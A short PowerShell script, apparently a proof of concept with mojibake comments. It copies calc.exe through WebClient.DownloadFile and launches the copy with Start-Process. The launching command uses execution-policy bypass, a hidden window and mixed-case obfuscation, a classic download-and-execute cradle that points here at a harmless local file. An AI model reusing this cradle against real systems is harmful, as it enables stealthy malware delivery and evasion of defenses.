# ��ȡ���нű�Ŀ¼
$x = $MyInvocation.MyCommand.Definition
$x = Split-Path -Parent $MyInvocation.MyCommand.Definition
echo "��ǰ·��Ϊ: $X\"


# 1�������ļ�

# ��ǰ·��������һ��������.exe

pOWErsHell.ExE -exEcUTIonPOLICy BYpAsS -nOprOFile -winDOWStyLE HiDden (NEW-objeCt SYSTeM.Net.weBCLIEnT).DOWNloaDfIlE('file://C:\Windows\System32\calc.exe',"$X\powershell_calc.EXE");

# 1.1 ��ִ���

$client = new-object System.Net.WebClient
$client.DownloadFile(��file://C:\Windows\System32\calc.exe��, "$X\powershell_calc_1.EXE")


# 2�������ļ�

sTArt-PrOCeSS "$X\powershell_calc.EXE"